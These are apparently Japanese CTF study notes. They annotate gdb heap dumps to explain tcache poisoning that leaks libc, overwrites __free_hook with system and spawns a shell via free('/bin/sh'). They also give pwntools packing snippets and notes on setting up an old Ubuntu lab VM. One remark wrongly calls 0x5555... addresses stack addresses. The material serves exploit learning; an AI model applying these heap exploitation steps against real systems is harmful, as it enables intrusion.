0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021 <- この0x21を0x41に変えればfreeすることでtcache[0x40]に値を代入できる！
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959 <- mallocが返したアドレス。mallocしたことでtcache[0x20]が0x0000555555757ad0に！
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~ 
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021


----------------------------------------------------------------------------
前のチャンクはfreeせず、0x20sizeをmalloc後

tcachebins
0x20 [ -1]: 0x7ffff7dcfca0 (main_arena+96)
0x100 [  6]: 0x555555757800 —▸ 0x5555557576c0 —▸ 0x555555757590 —▸ 0x555555757470 —▸ 0x555555757360 —▸ 0x555555757260 ◂— 0x0
unsortedbin
all: 0x555555757ac0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x555555757ac0

0x555555757a70:	0x4141414141414141	0x4141414141414141
0x555555757a80:	0x4141414141414141	0x0000000000000041
0x555555757a90:	0x00007ffff7000044	0x00007ffff7dcfdd0
0x555555757aa0:	0x0000000000000000	0x0000000000000021
0x555555757ab0:	0x0000555555757ad0	0x5959595959595959
0x555555757ac0:	0x0000000000000040	0x0000000000000101
0x555555757ad0:	0x00007ffff7dcfca0	0x00007ffff7dcfca0 <- mallocが返したアドレス。show関数でリークできる！
0x555555757ae0:	0x4141414141414141	0x4141414141414141
0x555555757af0:	0x4141414141414141	0x4141414141414141
       ~                 ~                   ~
0x555555757ba0:	0x4141414141414141	0x4141414141414141
0x555555757bb0:	0x4141414141414141	0x4141414141414141
0x555555757bc0:	0x0000000000000100	0x0000000000000020
0x555555757bd0:	0x0000000000000000	0x0000000000000000
0x555555757be0:	0x0000000000000000	0x0000000000000021
```
#### Heapでの system("/bin/sh")実行の流れ

```txt
------------------------------------------------------------------------------------
0x40サイズのmallocによって、偽のチャンクの0x555555757a90が返り、tcache[0x100]のnextに_free_hookアドレスを書き込んでfree後

(0x20)   tcache_entry[0](255): 0x7ffff7dcfca0 --> 0x555555757c30
(0x40)   tcache_entry[2](1): 0x555555757ab0
(0x100)   tcache_entry[14](7): 0x555555757ad0 (overlap chunk with 0x555555757aa0(freed) )
gdb-peda$ x/32gx 0x555555757a60
0x555555757a60: 0x3636363636363636      0x3636363636363636
0x555555757a70: 0x3636363636363636      0x3636363636363636
0x555555757a80: 0x3636363636363636      0x0000000000000041
0x555555757a90: 0x0000555555757a80      0x0000555555757a80
0x555555757aa0: 0x0000000000000000      0x0000000000000041 <- この偽のチャンクを使って_free_hookアドレスを書き込み、tcache[0x100]にoverlapさせる
0x555555757ab0: 0x0000000000000000      0x555555757010
0x555555757ac0: 0x5a5a5a5a5a5a5a5a      0x0000000000000101 <- freeすることでこの偽の0x100chunkに対応するtcache[0x100]に0x555555757ad0を代入(overlapする)
0x555555757ad0: 0x00007ffff7dd18e8      0x00007ffff7dcfc00 <- _free_hookを上書きした
0x555555757ae0: 0x3737373737373737      0x3737373737373737


次に0x100サイズmallocすれば、0x555555757ad0がmallocによって返り、nextの0x00007ffff7dd18e8がtcache[0x100]に入る
そのあと、freeせずにまた0x100サイズmallocすれば、0x00007ffff7dd18eがmallocによって返り、_free_hookアドレスにp64(addr_libc_system)を書き込める！
    これで、次にfreeするとsystem関数が実行される！
そのあと、freeせずに適当なサイズ(0x40とか)mallocし、"/bin/sh"をmallocが返したアドレスに書き込む
この後にfreeすれば、system("/bin/sh")が実行される！
    free関数はfree(content)となっており、contentはmallocが返したアドレスを指している
    このとき、content(というアドレス)には"/bin/sh"という文字列が入っている
    なので、free(content)はsystem(content)と同じであり、content="/bin/sh"なのでsystem("/bin/sh")が実行される！

```

#### Heap アドレス関係
```txt
libc_base        = addr_libc_mainarena - offset_libc_mainarena
addr_libc_system    = libc_base + offset_libc_system
addr_libc_str_sh (/bin/sh)   = libc_base + offset_libc_str_sh
addr_libc_free_hook    = libc_base + offset_libc_free_hook

(low)
|               |
|               |
|         0x251 | <- heap_base (不変)  0x555555757000
|               |
|0x555555757460 | <- tcache[0x120]の実体は0x250のchunkのどこかに存在
|               |
|               |
|         0x120 | <- 最後のチャンク 0x555555757460
|  AAAAA  AAAAA |
|   ~       ~   |
|  AAAAA  AAAAA |
|  AAAAA  20a00 | <- heap_top 0x555555757580
|               |    可変で下にどんどん伸びていく
|               |
|               |
|               |
|               | <- libc_base   0x7ffff79e4000 ??
|               |
|               |
|               | <- libc_system 0x7ffff7a33440
|               |
|               |
|               | <- main_arena  0x7ffff7dcfc40
|               |
|               | <- fastbinsの実体 (0x80bytes以下)
|               |
|               | <- bins(unsortedbins)の実体
|               |
|               |
(high)
```
#### 覚えておきたい
- アドレス   
`0x7fffff...`はスタックのアドレス。`0x555555...`はスタックのアドレス、であることが多い(?)。
- リトルエンディアン   
`ABCDEF`という入力をした場合、   
```txt
gdb-peda$ x /4wx $rbp-0x90
0x7fffffffdd90:	0x44434241	0x00004645	0xf7ffe710	0x00007fff

gdb-peda$ x /2gx $rbp-0x90
0x7fffffffdd90:	0x0000716034647461	0x00007ffff7ffe710

-> +0 | 44 43 42 41 |  
-> +4 | 00 00 46 45 | 

gdb-peda$ x /s $rbp-0x90
0x7fffffffdd90:	"ABCDEF"

RDI: 0x7fffffffdd90 --> 0x464544434241 ('ABCDEF')
```
メモリ上に格納される時、順序がこうなる。なお、文字列として読みだすときは順序が入力したときと同じに評価される。 

一方、アドレスは以下のように評価される。したがって、BOFでRIPを書き換えたりするときは、`10e7...ff7f`というように逆順に入力する必要がある。
```txt
gdb-peda$ x /gx $rbp-0x88
0x7fffffffdd98:	0x00007ffff7ffe710
```
- 文字列操作とか
  - 0x7fff1234 -> b '\x34\x12\xff\x7f'   
  ```python
  #python3のみ
  # 文字列と結合しようとすると、
  # TypeError: must be str, not bytes
  val.to_bytes(int(byte),'little')
  ```   
  ```python
  # python2 のみ
  from pwn import *
  r = remote("localhost", 4444)
  p32(0x7fff1234) # '4\x12\xff\x7f'
  p64(0x7fff1234) # '4\x12\xff\x7f\x00\x00\x00\x00'
  payload  = "A" * 0x28 + p64(0x7fff1234)
  r.send(payload)
  ```
  - \x34\x12\xff\x7f -> 0x7fff1234   
  ```python
  # python2 のみ
  from pwn import *
  hex(unpack('\xef\xbe\xad\xde')) # 0xdeadbeef
  hex(u32('\xef\xbe\xad\xde'))  # 0xdeadbeef
  hex(u64('\xef\xbe\xad\xde\x41\x42\x43\x45'))  # 0x45434241deadbeef
  
  # python2,3 両方
  import struct
  print(hex(struct.unpack('<I',b'\x34\x12\xff\x7f')[0]))
  ```
  
  # todo
  free, mallocの概念的理解（細かい挙動の理解と全体的な理解）   
  gdb-peadで一度tcacheとかの挙動をちゃんと確認する。   
  heap問の頻出パターンを押さえる(それまではあんまり自分で解いても意味なさそう)   
  libc_baseとかlibc.main_arenaとかの計算方法が全然わかってない   
  libc_baseよりmain_arenaの方が高いアドレスにある？   
  `p system`,`x/24xw &main_arena`   
  # vulnhubメモ
  ## 古いバージョンのLinuxのインストール
  https://soft.lafibre.info/   
  http://old-releases.ubuntu.com/releases/14.04.0/   
  からスカスカのubuntuをInstall。デスクトップは重い    
  .isoを使用して、VMを作成する。
  
  ### virtualbox の設定
  [export]すると、スナップショットも反映される。
  exportした.ovaを7zで圧縮(95%だからほぼされないけど)すると230MBくらいだった。   
  [新規]で[新しいハードディスクを作成]で、2.5GBくらい与える(1GだとInstall時にエラー)。   
  それで、[設定]で[光学ドライブ]の新規から、.isoファイルを選択して、[起動]して指示に従う。   
  10.04だけうまく行った。   
  
  ### install openssh
  `apt-get install openssh-server`だと、エラーで完了しない。   
  `apt-get update`しても、`faild to fetch`のerrorが大量に発生する。   
  rootになって、`apt-get update`する必要があるが、古いバージョンはパッケージの場所が変わっているため、`/etc/apt/sources.list`を書き換える必要がある。   
  `archive.ubuntu.com` -> `old-releases.ubuntu.com`   
  `us.archive.ubuntu.com` -> `old-releases.ubuntu.com`   
  `security.ubuntu.com` -> `old-releases.ubuntu.com`   
  https://qiita.com/ytyng/items/76784390a538bbb5117e   
  そのあと、`apt-get install openssh-server`でsshがinstallされて、sshdが起動した状態になった。
  
  ### install apache2
  `apt-get install apache2`   
  `apt-get install php5`   
  `usermod -s /usr/sbin/nologin www-data`   
  でwww-dataがログインできないようにする。   
  これで、80portにapacheが、index.htmlだけを持っている状態でInstallされた。   
  https://netlog.jpn.org/r271-635/2009/06/apache_ssl_on_ubuntu_81.html   
  
  ### install dovecot
  `apt-get install dovecot-imapd dovecot-pop3d`   
  でInstallすると、110,143,993,995で立ち上がる。   
  `/etc/dovecot/dovecot.conf`を以下のように編集すると、`user test`,`pass test`でログインできた。   
  ```txt
  disable_plaintext_auth = no (コメントアウトを外す)
  
  mail_location = maildir:~/Maildir (コメントアウトを外す)
  
  # mail_access_groups = (コメントアウトのまま)
  ```
  /home/test/Maildirが作成された。   
  `/home/test/Maildir/new`以下のファイルをログイン後に参照できる。
